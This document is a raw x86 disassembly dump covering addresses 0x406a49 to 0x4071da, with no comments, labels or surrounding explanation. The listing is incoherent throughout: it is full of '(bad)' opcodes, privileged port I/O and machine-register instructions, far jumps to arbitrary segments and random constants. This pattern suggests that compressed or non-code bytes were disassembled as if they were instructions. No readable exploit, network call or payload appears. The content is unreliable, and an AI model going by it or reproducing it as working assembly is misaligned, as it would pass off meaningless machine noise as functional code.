  406a49:	int    0x4e
  406a4b:	int3   
  406a4c:	jecxz  0x406acd
  406a4e:	adc    BYTE PTR [eax+0x2d],ah
  406a51:	push   ebx
  406a52:	outs   dx,BYTE PTR ds:[esi]
  406a53:	jmp    0xd5c442d9
  406a58:	add    bl,cl
  406a5a:	add    BYTE PTR [eax+0x4c],al
  406a5d:	pop    esi
  406a5e:	push   ds
  406a5f:	aaa    
  406a60:	pop    esp
  406a61:	dec    esi
  406a62:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  406a64:	stos   BYTE PTR es:[edi],al
  406a65:	or     cl,BYTE PTR ds:[ecx+0x33]
  406a69:	shl    ecx,1
  406a6b:	adc    eax,0xba78bcf2
  406a70:	and    ax,0x3b51
  406a74:	test   eax,0xb0bd3fa7
  406a79:	in     al,dx
  406a7a:	mov    al,ds:0xff4cc221
  406a7f:	sti    
  406a80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a82:	and    eax,0xe0ef770c
  406a87:	fcom   QWORD PTR [edi+0x76fac577]
  406a8d:	sub    DWORD PTR [eax+ebx*2+0x49c5ecb4],ebp
  406a94:	inc    esi
  406a95:	outs   dx,DWORD PTR ds:[esi]
  406a96:	in     al,dx
  406a97:	daa    
  406a98:	into   
  406a99:	jle    0x406a1d
  406a9b:	(bad)  
  406a9d:	mov    ch,0x12
  406a9f:	test   DWORD PTR [edx],esp
  406aa1:	jp     0x406a8c
  406aa3:	push   es
  406aa4:	mov    edx,0xe6b81277
  406aa9:	mov    al,0xe
  406aab:	int3   
  406aac:	jmp    0xc8a66678
  406ab1:	mov    al,0x15
  406ab3:	pop    esi
  406ab4:	(bad)
  406ab7:	sbb    eax,DWORD PTR [edx-0x2aa104a9]
  406abd:	std    
  406abe:	cmc    
  406abf:	sbb    al,0x16
  406ac1:	mov    ecx,0x274a7750
  406ac6:	and    DWORD PTR [ebx-0xf],ebp
  406ac9:	pop    ecx
  406aca:	pop    eax
  406acb:	push   edx
  406acc:	addr16 xor eax,0x1dccee6c
  406ad2:	(bad)  
  406ad3:	scas   eax,DWORD PTR es:[edi]
  406ad4:	mov    BYTE PTR [edi+edi*2+0xc],dl
  406ad8:	add    BYTE PTR [eax+0x7877ccf6],cl
  406ade:	stos   DWORD PTR es:[edi],eax
  406adf:	pop    ebp
  406ae0:	push   cs
  406ae1:	xchg   DWORD PTR [edi+0x5a8b99e],edi
  406ae7:	mov    edx,0x2bb6fe98
  406aec:	call   0x74c44ae
  406af1:	xchg   esi,eax
  406af2:	div    BYTE PTR [eax-0x1e5a1264]
  406af8:	(bad)  
  406af9:	sub    DWORD PTR [ecx+edx*1+0x3249c0b9],0xffffffed
  406b01:	sbb    DWORD PTR [ebx-0x1],ecx
  406b04:	out    0xef,eax
  406b06:	bound  ebp,QWORD PTR [eax+0x443b49eb]
  406b0c:	xchg   edx,eax
  406b0d:	sahf   
  406b0e:	bound  esp,QWORD PTR [edi+eax*1+0x75]
  406b12:	or     eax,0x465d9525
  406b17:	lock or dl,0x55
  406b1b:	pop    ebx
  406b1c:	jle    0x406af3
  406b1e:	jecxz  0x406ab9
  406b20:	in     al,dx
  406b21:	inc    edi
  406b22:	adc    ebx,esp
  406b24:	pop    esi
  406b25:	stos   DWORD PTR es:[edi],eax
  406b26:	cdq    
  406b27:	leave  
  406b28:	out    dx,eax
  406b29:	inc    edi
  406b2a:	cmp    DWORD PTR [ebp-0x13328e44],ebx
  406b30:	scas   al,BYTE PTR es:[edi]
  406b31:	dec    edi
  406b32:	daa    
  406b33:	mov    esi,0x55cac20c
  406b38:	jbe    0x406b16
  406b3a:	mov    DWORD PTR ds:0x706fd89a,ebp
  406b40:	pop    esi
  406b41:	cli    
  406b42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b43:	pop    eax
  406b44:	lahf   
  406b45:	test   al,0xce
  406b47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b48:	mov    al,ds:0x4a79e1ab
  406b4d:	ds out 0x65,eax
  406b50:	mov    ah,0x5b
  406b52:	shr    BYTE PTR [esi+edi*1+0x47],1
  406b56:	(bad)  
  406b57:	pop    ds
  406b58:	or     al,ch
  406b5a:	mov    BYTE PTR [edi+ebp*1+0x2f],al
  406b5e:	clc    
  406b5f:	inc    ebx
  406b60:	xchg   ecx,eax
  406b61:	jg     0x406bc1
  406b63:	jp     0x406be1
  406b65:	xlat   BYTE PTR ds:[ebx]
  406b66:	mov    bl,0x52
  406b68:	aam    0x59
  406b6a:	jmp    0x9d5e:0xcc850613
  406b71:	sbb    DWORD PTR [esp+edi*4-0x1d084f49],0x85b80bc8
  406b7c:	(bad)  
  406b7d:	xlat   BYTE PTR ds:[ebx]
  406b7e:	pop    edi
  406b7f:	jb     0x406be0
  406b81:	dec    ebp
  406b82:	sbb    ebx,ebp
  406b84:	pop    edi
  406b85:	shr    ecx,1
  406b87:	clc    
  406b88:	stos   DWORD PTR es:[edi],eax
  406b89:	bt     DWORD PTR [edi-0x78],esp
  406b8d:	inc    edi
  406b8e:	jae    0x406bc4
  406b90:	mov    ecx,0xd14880b3
  406b95:	jb     0x406bef
  406b97:	inc    edi
  406b98:	push   esi
  406b99:	(bad)  
  406b9a:	mov    dh,BYTE PTR [ebx]
  406b9c:	stc    
  406b9d:	pop    esp
  406b9e:	loopne 0x406bee
  406ba0:	ret    0xe57d
  406ba3:	shl    BYTE PTR [ecx],0x80
  406ba6:	adc    al,0xf3
  406ba8:	inc    ecx
  406ba9:	loopne 0x406bdb
  406bab:	and    cl,0x24
  406bae:	test   BYTE PTR [ebx+0x6564e1bb],ch
  406bb4:	xor    eax,0x2f897fd
  406bb9:	loop   0x406b3f
  406bbb:	dec    ebx
  406bbc:	xlat   BYTE PTR ds:[ebx]
  406bbd:	repnz bound ebx,QWORD PTR [esi]
  406bc0:	cmp    al,0x3c
  406bc2:	xor    al,0xc6
  406bc4:	popf   
  406bc5:	mov    ebx,0x246ebab6
  406bca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bcb:	fcomp  QWORD PTR [ecx]
  406bcd:	push   edx
  406bce:	out    0xe7,eax
  406bd0:	outs   dx,BYTE PTR ds:[esi]
  406bd1:	and    dh,ah
  406bd3:	das    
  406bd4:	retf   0xa5ad
  406bd7:	cmp    al,cl
  406bd9:	sbb    edx,DWORD PTR [edx+ebx*4]
  406bdc:	and    ah,0x18
  406bdf:	sub    DWORD PTR [esi-0x4a],edx
  406be2:	xlat   BYTE PTR ds:[ebx]
  406be3:	jne    0x406bc4
  406be5:	add    bh,BYTE PTR [ebp+ebp*2+0x271a4da7]
  406bec:	xchg   ebx,eax
  406bed:	push   ebx
  406bee:	xchg   ecx,eax
  406bef:	adc    esi,DWORD PTR [edi-0x19]
  406bf2:	imul   esi,DWORD PTR [esi],0x6d91807d
  406bf8:	dec    edx
  406bf9:	jno    0x406bcb
  406bfb:	mov    esp,0x9ef6cdaa
  406c00:	cmp    edi,DWORD PTR [edi+esi*2]
  406c03:	cwde   
  406c04:	(bad)  [ebx]
  406c06:	inc    eax
  406c07:	dec    ecx
  406c08:	mov    al,ds:0xa92e9562
  406c0d:	inc    ebp
  406c0e:	push   ds
  406c0f:	popf   
  406c10:	or     BYTE PTR [edi+0x3c0c61bf],bl
  406c16:	cwde   
  406c17:	jne    0x406c25
  406c19:	call   0xed35:0x591098d6
  406c20:	ins    BYTE PTR es:[edi],dx
  406c21:	sbb    al,0xdd
  406c23:	iret   
  406c24:	in     eax,dx
  406c25:	add    ch,BYTE PTR [edx-0x77bb0fc5]
  406c2b:	mov    ebp,0xba967904
  406c30:	pusha  
  406c31:	adc    DWORD PTR [ecx+0xb452230],edx
  406c37:	xchg   ebp,eax
  406c38:	addr16 clc 
  406c3a:	mov    esp,0xfaba80b5
  406c3f:	mov    al,ds:0x6fa146ed
  406c44:	(bad)  
  406c45:	js     0x406c4e
  406c47:	fisubr WORD PTR [edx]
  406c49:	(bad)  
  406c4a:	out    0x42,al
  406c4c:	add    dl,BYTE PTR [edi]
  406c4e:	inc    esi
  406c4f:	xchg   esp,eax
  406c50:	scas   eax,DWORD PTR es:[edi]
  406c51:	xchg   ebp,eax
  406c52:	mov    ds:0x9c128ecc,al
  406c57:	dec    ebx
  406c58:	or     bl,BYTE PTR [eax-0x6afa3901]
  406c5e:	pop    ebx
  406c5f:	scas   eax,DWORD PTR es:[edi]
  406c60:	cmp    eax,0x623229a0
  406c65:	mov    esp,0x451e1dd6
  406c6a:	ret    
  406c6b:	cdq    
  406c6c:	data16 ins BYTE PTR es:[edi],dx
  406c6e:	push   esp
  406c6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c70:	daa    
  406c71:	inc    edx
  406c72:	adc    DWORD PTR [ecx],edi
  406c74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c75:	(bad)  
  406c76:	call   eax
  406c78:	ja     0x406caa
  406c7a:	mov    cl,0xd0
  406c7c:	pop    ecx
  406c7d:	call   0x6500cff5
  406c82:	mov    edi,DWORD PTR [eax-0x16]
  406c85:	mov    dh,0x48
  406c87:	ja     0x406c4d
  406c89:	shl    BYTE PTR [esi+ebx*4+0x38],1
  406c8d:	xchg   esi,eax
  406c8e:	or     eax,eax
  406c90:	out    0x39,al
  406c92:	and    al,0x20
  406c94:	call   FWORD PTR [edi+0x4e]
  406c97:	into   
  406c98:	mov    cl,0x3c
  406c9a:	(bad)  
  406c9b:	mov    esi,0xb69ca514
  406ca0:	push   ds
  406ca1:	sub    BYTE PTR [edx],bl
  406ca3:	cmp    eax,0x5dbe59ff
  406ca8:	pushf  
  406ca9:	inc    edi
  406caa:	sbb    DWORD PTR [ebp-0x71],0x3e
  406cae:	inc    esi
  406caf:	and    dl,BYTE PTR [esi+0x29]
  406cb2:	sti    
  406cb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cb4:	cmc    
  406cb5:	int3   
  406cb6:	enter  0xeccc,0x0
  406cba:	mov    ds:0x7f3ef4fb,al
  406cbf:	mov    ebx,0x6bbd7e28
  406cc4:	inc    esp
  406cc5:	pusha  
  406cc6:	sbb    BYTE PTR [esi-0x29],dl
  406cc9:	shl    BYTE PTR [esi],1
  406ccb:	adc    esi,ecx
  406ccd:	cmp    eax,0xd3391f16
  406cd2:	in     al,dx
  406cd3:	cmp    ecx,DWORD PTR [esi-0x3b]
  406cd6:	mov    gs,WORD PTR [ecx-0x2acc2be5]
  406cdc:	lds    ebx,FWORD PTR [ebx+ebp*2+0x27]
  406ce0:	mov    esi,DWORD PTR [ebx]
  406ce2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ce3:	pop    ss
  406ce4:	sub    eax,0xe15c8492
  406ce9:	mov    ebx,0x19b73398
  406cee:	and    DWORD PTR ds:0xf94c9220,esp
  406cf4:	jmp    0x406d08
  406cf6:	add    DWORD PTR [esi+0x2b],ebp
  406cf9:	iret   
  406cfa:	sar    dh,0xad
  406cfd:	js     0x406d03
  406cff:	scas   al,BYTE PTR es:[edi]
  406d00:	or     DWORD PTR [edi],eax
  406d02:	imul   ebp,edx,0x33
  406d05:	dec    ecx
  406d06:	popa   
  406d07:	push   ebx
  406d08:	ret    
  406d09:	adc    al,0x4b
  406d0b:	popa   
  406d0c:	sub    eax,0x56d4d24
  406d11:	imul   esp,DWORD PTR [ecx+0x17851182],0xf4249a6a
  406d1b:	push   ds
  406d1c:	lock in al,dx
  406d1e:	inc    eax
  406d1f:	fild   DWORD PTR [eax]
  406d21:	call   0x7defc16b
  406d26:	mov    cl,0xe9
  406d28:	sbb    BYTE PTR ds:0xdd3c7fcf,ah
  406d2e:	bound  edi,QWORD PTR [ebx+0x222044a]
  406d34:	mov    al,0x11
  406d36:	adc    cl,BYTE PTR [ecx-0x77]
  406d39:	into   
  406d3a:	mov    ecx,DWORD PTR [eax+edi*1+0x60]
  406d3e:	dec    ebx
  406d3f:	mov    ecx,0x3b4bde91
  406d44:	(bad)  
  406d45:	repz fsubp st(6),st
  406d48:	sbb    al,0x94
  406d4a:	jmp    0xa59c:0x55cd294e
  406d51:	xchg   esi,eax
  406d52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d53:	clc    
  406d54:	push   esi
  406d55:	push   eax
  406d56:	pop    ds
  406d57:	cdq    
  406d58:	mul    BYTE PTR [edi+0x1f]
  406d5b:	adc    al,0x29
  406d5d:	push   0x79
  406d5f:	jle    0x406dd8
  406d61:	add    dh,BYTE PTR [ebx]
  406d63:	fbstp  TBYTE PTR [eax]
  406d65:	(bad)  [eax+0x20]
  406d68:	out    0xa3,al
  406d6a:	repz pop ecx
  406d6c:	enter  0x8751,0xab
  406d70:	popf   
  406d71:	jecxz  0x406d2b
  406d73:	mov    DWORD PTR [esi+0xc],ebx
  406d76:	iret   
  406d77:	sbb    ah,BYTE PTR [esi-0x5e]
  406d7a:	in     al,dx
  406d7b:	imul   edi,eax,0x2fbdbe33
  406d81:	inc    edx
  406d82:	dec    esp
  406d83:	inc    ecx
  406d84:	inc    eax
  406d85:	lahf   
  406d86:	cmp    eax,0x2a605336
  406d8b:	mov    WORD PTR [edi],gs
  406d8d:	cmp    bl,BYTE PTR [ebp+esi*4+0x36]
  406d91:	lock mov cl,BYTE PTR [esi]
  406d94:	and    al,0xbf
  406d96:	dec    ebx
  406d97:	mov    ch,0x70
  406d99:	mov    ah,0x59
  406d9b:	pop    esp
  406d9c:	fnsave [esi+0x1e31f8e7]
  406da2:	push   ds
  406da3:	xchg   esp,eax
  406da4:	sub    dl,dl
  406da6:	sub    esi,DWORD PTR [edx+0x7835e02e]
  406dac:	cmp    bh,BYTE PTR [ebp+0x6a]
  406daf:	dec    edi
  406db0:	mov    cl,0xdb
  406db2:	jmp    0x77018e6d
  406db7:	and    edi,ebx
  406db9:	(bad)  
  406dba:	sti    
  406dbb:	out    dx,al
  406dbc:	add    edi,ebx
  406dbe:	leave  
  406dbf:	mov    esp,DWORD PTR [ecx]
  406dc1:	sub    eax,ebx
  406dc3:	add    eax,0x229ee68
  406dc8:	or     ebp,DWORD PTR [ebp+edi*2+0x25]
  406dcc:	aad    0x64
  406dce:	jne    0x406db8
  406dd0:	sbb    bl,ah
  406dd2:	push   eax
  406dd3:	inc    esp
  406dd4:	cmp    bh,BYTE PTR [esi]
  406dd6:	imul   esp,DWORD PTR [esi+0x68],0xe465a56f
  406ddd:	inc    ebp
  406dde:	push   eax
  406ddf:	inc    eax
  406de0:	add    dl,dh
  406de2:	pop    ss
  406de3:	scas   al,BYTE PTR es:[edi]
  406de4:	and    dl,BYTE PTR [esi]
  406de6:	mov    edi,0xc4256fed
  406deb:	nop
  406dec:	adc    edi,DWORD PTR [edi+0x513fbc61]
  406df2:	adc    DWORD PTR [esi+0x4a],esi
  406df5:	pop    ebx
  406df6:	int    0x78
  406df8:	mov    eax,ds:0x9bb5296c
  406dfe:	jl     0x406d93
  406e00:	(bad)  
  406e02:	test   DWORD PTR [ebx-0x2a],edx
  406e05:	stos   BYTE PTR es:[edi],al
  406e06:	push   0x7b
  406e08:	out    dx,eax
  406e09:	pop    edx
  406e0a:	in     al,0x7c
  406e0c:	sbb    BYTE PTR [ebx+0x30],ch
  406e0f:	mov    ebx,DWORD PTR [ecx]
  406e11:	sbb    dl,ch
  406e13:	xor    BYTE PTR [esi+eax*8+0x39],cl
  406e17:	sbb    DWORD PTR [ebx],ebx
  406e19:	mov    ds:0xf412d279,al
  406e1e:	iret   
  406e1f:	pop    edi
  406e20:	xchg   edx,eax
  406e21:	mov    ecx,ebx
  406e23:	call   0xa387:0x1befd524
  406e2a:	sub    ebp,DWORD PTR [ebx]
  406e2c:	scas   al,BYTE PTR es:[edi]
  406e2d:	or     edx,DWORD PTR [esi+0x6af8678d]
  406e33:	jb     0x406de7
  406e35:	test   BYTE PTR [eax+0x31fae302],0xbd
  406e3c:	xor    al,0x84
  406e3e:	and    esi,DWORD PTR ds:0x8347701f
  406e44:	cdq    
  406e45:	xor    ebx,DWORD PTR [esi+0x759ce130]
  406e4b:	pop    ds
  406e4c:	std    
  406e4d:	(bad)  
  406e4e:	call   0xe9dcf675
  406e53:	cmp    al,0xa1
  406e55:	dec    esp
  406e56:	mov    esp,0x74906af9
  406e5b:	pop    edi
  406e5c:	inc    esp
  406e5d:	or     DWORD PTR [eax+0x1b],0xffffffa0
  406e61:	xchg   ebp,eax
  406e62:	or     edx,ebx
  406e64:	push   ds
  406e65:	enter  0x5bb3,0xbb
  406e69:	pop    esp
  406e6a:	pop    ecx
  406e6b:	in     al,dx
  406e6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e6d:	das    
  406e6e:	push   ss
  406e6f:	aaa    
  406e70:	lahf   
  406e71:	xor    edi,DWORD PTR [ebx+eax*8-0x54]
  406e75:	fmul   QWORD PTR [ecx-0x2e2bb93b]
  406e7b:	mov    ch,0xda
  406e7d:	push   ds
  406e7e:	div    ah
  406e80:	jmp    0x5383:0xc1df7a39
  406e87:	scas   al,BYTE PTR es:[edi]
  406e88:	jnp    0x406e58
  406e8a:	std    
  406e8b:	sbb    ecx,DWORD PTR [edx+ebx*1]
  406e8e:	aam    0xa1
  406e90:	pop    ss
  406e91:	daa    
  406e92:	and    bh,BYTE PTR [ebp+0x4e]
  406e95:	call   0xf7db06c7
  406e9a:	imul   esi,ebx,0x4bf186fd
  406ea0:	(bad)
  406ea3:	aas    
  406ea4:	jmp    0x60bb0b6d
  406ea9:	push   0xffffffc4
  406eab:	xchg   esp,eax
  406eac:	stos   DWORD PTR es:[edi],eax
  406ead:	sub    esi,DWORD PTR [ebx-0x75278333]
  406eb3:	and    BYTE PTR [eax+0x1a8f2d88],0xe5
  406eba:	xchg   ebx,eax
  406ebb:	ins    BYTE PTR es:[edi],dx
  406ebc:	cmp    DWORD PTR [ecx-0xd],edx
  406ebf:	shl    DWORD PTR ds:0xe6dde15b,0xa0
  406ec6:	mov    WORD PTR [esi+0x35fb95ac],ss
  406ecc:	jmp    DWORD PTR [eax-0x7b]
  406ecf:	pop    edi
  406ed0:	shl    al,cl
  406ed2:	hlt    
  406ed3:	sti    
  406ed4:	or     dh,BYTE PTR [ebx+0x20465238]
  406eda:	scas   al,BYTE PTR es:[edi]
  406edb:	jmp    0x3a02:0xf9fe73f9
  406ee2:	push   ebp
  406ee3:	mov    ch,0xe1
  406ee5:	push   esi
  406ee6:	pop    eax
  406ee7:	cmp    bh,BYTE PTR [ebp+0x66]
  406eea:	xchg   ebx,eax
  406eeb:	sbb    DWORD PTR [ebp-0x1c82b956],eax
  406ef1:	dec    edx
  406ef2:	pusha  
  406ef3:	mov    eax,0x25d74cb7
  406ef8:	repz clc 
  406efa:	repz jno 0x406eaa
  406efd:	mov    ecx,0x6801b492
  406f02:	jmp    0xf6dcaaa0
  406f07:	lahf   
  406f08:	arpl   WORD PTR [edi],cx
  406f0a:	rcr    BYTE PTR [ebp+0x7c],0xaa
  406f0e:	xchg   ebp,eax
  406f0f:	mov    bl,0x5b
  406f11:	mov    dl,0x84
  406f13:	mov    ch,BYTE PTR [edi-0x3f]
  406f16:	jns    0x406f27
  406f18:	pop    ecx
  406f19:	int    0x93
  406f1b:	dec    eax
  406f1c:	div    BYTE PTR [eax-0x4b]
  406f1f:	xor    BYTE PTR [edx-0x3e],ah
  406f22:	addr16 retf 
  406f24:	imul   edx,ecx,0x3462cef
  406f2a:	outs   dx,WORD PTR ds:[esi]
  406f2c:	cmp    al,0xf0
  406f2e:	fwait
  406f2f:	retf   0xde79
  406f32:	or     BYTE PTR [esi],dl
  406f34:	adc    DWORD PTR [ecx+0x73],ecx
  406f37:	sbb    DWORD PTR [edx],eax
  406f39:	push   0x216d9bf8
  406f3e:	ins    BYTE PTR es:[edi],dx
  406f3f:	mov    DWORD PTR [edx+0x26],0x62a8ad7d
  406f46:	(bad)  
  406f47:	sub    DWORD PTR [edx+ebx*2+0x5d36cf51],ecx
  406f4e:	test   eax,0x53f78d72
  406f53:	inc    esp
  406f54:	xor    BYTE PTR [esi+ebp*2],cl
  406f57:	inc    ebp
  406f58:	mov    gs,ebx
  406f5a:	mul    DWORD PTR [edx-0x1879d1ba]
  406f60:	dec    ecx
  406f61:	sbb    esp,DWORD PTR [ebp+0x58]
  406f64:	sbb    esp,ebp
  406f66:	fst    DWORD PTR [ebx-0x6c]
  406f69:	lahf   
  406f6a:	es inc ebp
  406f6c:	(bad)  
  406f6d:	into   
  406f6e:	pop    ss
  406f6f:	sub    DWORD PTR [esi+0x69],ebx
  406f72:	imul   ebp,DWORD PTR [eax],0xea15e102
  406f78:	push   esi
  406f79:	cdq    
  406f7a:	pop    ebx
  406f7b:	xor    dh,ch
  406f7d:	stos   DWORD PTR es:[edi],eax
  406f7e:	js     0x406f7b
  406f80:	mov    al,ds:0x36013a7e
  406f85:	push   edi
  406f86:	popa   
  406f87:	int    0xbe
  406f89:	sbb    esp,ebx
  406f8b:	das    
  406f8c:	jo     0x406f6c
  406f8e:	xchg   edx,eax
  406f8f:	sub    dh,bh
  406f91:	les    ebx,FWORD PTR [edi+eax*1]
  406f94:	jnp    0x406fc7
  406f96:	(bad)  
  406f97:	adc    al,0xb1
  406f99:	mov    edx,DWORD PTR [esi+0x11198d48]
  406f9f:	dec    esi
  406fa0:	inc    ebp
  406fa1:	and    ecx,DWORD PTR [ebx-0x50]
  406fa4:	loopne 0x406faf
  406fa6:	pop    eax
  406fa7:	sub    esp,DWORD PTR [edi-0x3c5771d5]
  406fad:	xlat   BYTE PTR ds:[ebx]
  406fae:	je     0x406ff6
  406fb0:	test   al,0xee
  406fb2:	mov    ch,BYTE PTR [ecx]
  406fb4:	mov    ah,0xa9
  406fb6:	add    esp,DWORD PTR ds:0x9362b6f4
  406fbc:	pop    es
  406fbd:	mov    eax,0x537ccbde
  406fc2:	xchg   edx,eax
  406fc3:	call   0x3444:0x8bc943d1
  406fca:	mov    fs,ebx
  406fcc:	pop    edx
  406fcd:	leave  
  406fce:	mov    ecx,0x16d7f23b
  406fd3:	imul   ebp,DWORD PTR [eax-0x7d],0x42
  406fd7:	mov    ebp,0x3fb1d34c
  406fdc:	mov    ebx,0x525d4b2d
  406fe1:	aam    0xe5
  406fe3:	retf   
  406fe4:	call   0x539d2c36
  406fe9:	pop    edi
  406fea:	mov    ebp,0x950c0245
  406fef:	sub    DWORD PTR ds:0x34caf7f,edx
  406ff5:	test   DWORD PTR [eax],ebx
  406ff7:	int    0x98
  406ff9:	push   es
  406ffa:	add    al,0xaf
  406ffc:	(bad)  
  406ffd:	es (bad) 
  406fff:	mov    edi,0x6474fcf2
  407004:	mov    ecx,0x1c80a5e7
  407009:	adc    al,0x1c
  40700b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40700c:	xchg   ebx,eax
  40700d:	retf   
  40700e:	sbb    BYTE PTR [eax-0x28],ch
  407011:	jno    0x40707c
  407013:	and    DWORD PTR [edi-0x6442e836],eax
  407019:	sbb    BYTE PTR [ebp+0x2f91f50c],bl
  40701f:	mov    ebp,0x5ca8b34e
  407024:	mov    ebp,0xf41787d4
  407029:	test   BYTE PTR [edx],cl
  40702b:	enter  0xd7ad,0x4f
  40702f:	mov    edi,0xa0fa9e46
  407034:	shl    BYTE PTR [eax],0xff
  407037:	mov    ?,WORD PTR [ebx+0x778356d5]
  40703d:	jge    0x40705d
  40703f:	pop    es
  407040:	xchg   edx,eax
  407041:	mov    edx,0xc0a8f514
  407046:	jge    0x40709c
  407048:	dec    ebx
  407049:	sub    esp,DWORD PTR [ecx+esi*8]
  40704c:	rcr    al,cl
  40704e:	mov    al,0x30
  407050:	push   ecx
  407051:	cmp    DWORD PTR [ecx-0x324e09b7],eax
  407057:	mov    ds:0x329fc482,eax
  40705c:	lds    eax,FWORD PTR [esi]
  40705e:	inc    edx
  40705f:	sub    esi,DWORD PTR [eax+0x6]
  407062:	sbb    BYTE PTR [esi+0x61],bl
  407065:	jmp    0xc3e9d26d
  40706a:	hlt    
  40706b:	sbb    eax,DWORD PTR [ebx]
  40706d:	sub    eax,0xc3455769
  407072:	imul   esi,DWORD PTR [ecx+0x6d2b3d09],0xffffffa3
  407079:	jns    0x40702e
  40707b:	rcl    BYTE PTR ds:0x90208095,1
  407081:	push   ecx
  407082:	xor    al,0xa4
  407084:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407085:	rdmsr  
  407087:	(bad)  
  407088:	push   ss
  407089:	repnz (bad) [edx]
  40708c:	in     al,0x6f
  40708e:	push   ss
  40708f:	xor    BYTE PTR [edi],cl
  407091:	push   edi
  407092:	lods   al,BYTE PTR ds:[esi]
  407093:	out    dx,eax
  407094:	jae    0x4070d5
  407096:	rcr    BYTE PTR [eax+ebx*1-0x1e],cl
  40709a:	inc    esp
  40709b:	xchg   esp,eax
  40709c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40709d:	ins    DWORD PTR es:[edi],dx
  40709e:	dec    edx
  40709f:	js     0x40703e
  4070a1:	call   0x29dd:0x458cd917
  4070a8:	imul   ebp,DWORD PTR [esi+0x3bad0dc0],0x3c
  4070af:	fadd   QWORD PTR [edi+eiz*4]
  4070b2:	jmp    0x4070af
  4070b4:	imul   eax,edx,0xa8b5d57d
  4070ba:	add    BYTE PTR [esi],0x2e
  4070bd:	shl    DWORD PTR [ecx+0x23f34595],0xf5
  4070c4:	sbb    al,0x4f
  4070c6:	repnz in al,dx
  4070c8:	xor    bl,BYTE PTR [eax]
  4070ca:	stos   BYTE PTR es:[edi],al
  4070cb:	xchg   edx,eax
  4070cc:	rcr    dh,1
  4070ce:	and    dl,bh
  4070d0:	or     eax,0x298e86ab
  4070d5:	dec    esp
  4070d6:	mov    ch,0xbf
  4070d8:	or     cl,dl
  4070da:	inc    edi
  4070db:	xor    DWORD PTR ds:[ebx+0x7c9782e5],ebx
  4070e2:	shl    DWORD PTR [edi+0x38f5351a],0x0
  4070e9:	ror    bl,cl
  4070eb:	mov    bl,0xb1
  4070ed:	out    0x66,eax
  4070ef:	lea    esp,[esi+0x78]
  4070f2:	bound  ebp,QWORD PTR [edi+0x20598ca4]
  4070f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070f9:	lds    esp,FWORD PTR [esi+ebp*8+0x17d593c9]
  407100:	fdiv   st,st(3)
  407102:	setp   BYTE PTR [ebp-0x66]
  407106:	add    ch,0xc8
  407109:	repnz bnd jg 0x4070b0
  40710d:	aad    0x7a
  40710f:	xchg   ecx,eax
  407110:	cmp    BYTE PTR [ebp-0x4065703a],bh
  407116:	icebp  
  407117:	adc    al,0xaf
  407119:	sahf   
  40711a:	lea    ebx,[ebx+0x439896b2]
  407120:	js     0x4070b1
  407122:	dec    esp
  407123:	cli    
  407124:	idiv   DWORD PTR [edi-0x5b]
  407127:	ja     0x4070b0
  407129:	or     al,0xf7
  40712b:	push   ebx
  40712c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40712d:	push   0xfeceb5f1
  407132:	mov    cl,BYTE PTR [esi]
  407134:	int    0x9e
  407136:	outs   dx,BYTE PTR ss:[esi]
  407138:	or     dh,BYTE PTR [ecx]
  40713a:	dec    esp
  40713b:	ror    DWORD PTR [ebx+0x16],0xfb
  40713f:	in     al,dx
  407140:	fwait
  407141:	and    WORD PTR [eax-0x51],dx
  407145:	push   eax
  407146:	ja     0x40715c
  407148:	scas   al,BYTE PTR es:[edi]
  407149:	stos   BYTE PTR es:[edi],al
  40714a:	or     dh,BYTE PTR [ebx+edi*2-0x57]
  40714e:	sbb    DWORD PTR [esi-0x22ea5933],edi
  407154:	mov    esp,DWORD PTR [ebx-0x35]
  407157:	ins    DWORD PTR es:[edi],dx
  407158:	push   ebp
  407159:	adc    dh,ah
  40715b:	stc    
  40715c:	das    
  40715d:	jnp    0x4071c4
  40715f:	das    
  407160:	loope  0x407178
  407162:	fcomi  st,st(0)
  407164:	cmp    BYTE PTR [edi+edi*1-0x7783c072],al
  40716b:	adc    ebx,DWORD PTR ss:[edi+0x19faf4db]
  407172:	push   ebp
  407173:	cmp    DWORD PTR [eax],esp
  407175:	or     edi,DWORD PTR [edi+0x5451ca17]
  40717b:	jl     0x40712f
  40717d:	in     eax,dx
  40717e:	add    ah,dl
  407180:	jo     0x407138
  407182:	inc    ecx
  407183:	cdq    
  407184:	and    eax,0x70c1989c
  407189:	test   edx,0xd129d4ff
  40718f:	lds    ebx,FWORD PTR [edx]
  407191:	mov    BYTE PTR ds:0xda107b99,ch
  407197:	sub    edx,DWORD PTR [esi+eax*4-0x4de26f59]
  40719e:	iret   
  40719f:	cli    
  4071a0:	push   edi
  4071a1:	cmp    al,0xa
  4071a3:	aam    0xcd
  4071a5:	jb     0x4071e4
  4071a7:	xor    eax,0x4c065498
  4071ac:	jns    0x40718c
  4071ae:	fnstcw WORD PTR [edi+eax*2]
  4071b1:	dec    edx
  4071b2:	fdiv   DWORD PTR [esi]
  4071b4:	aad    0x5
  4071b6:	in     al,0xf2
  4071b8:	out    dx,al
  4071b9:	xlat   BYTE PTR ds:[ebx]
  4071ba:	mov    al,ds:0x50e8c3f1
  4071bf:	jge    0x4071d8
  4071c1:	cmp    al,0x5a
  4071c3:	outs   dx,BYTE PTR ds:[esi]
  4071c4:	pop    esi
  4071c5:	lahf   
  4071c6:	pop    es
  4071c7:	and    al,0x3b
  4071c9:	ud2    
  4071cb:	pushf  
  4071cc:	or     eax,0x5e48088e
  4071d1:	add    al,0x5
  4071d3:	fmul   QWORD PTR [ecx+0x2ae4b8f2]
  4071d9:	pop    ecx
  4071da:	jae    0x40716a
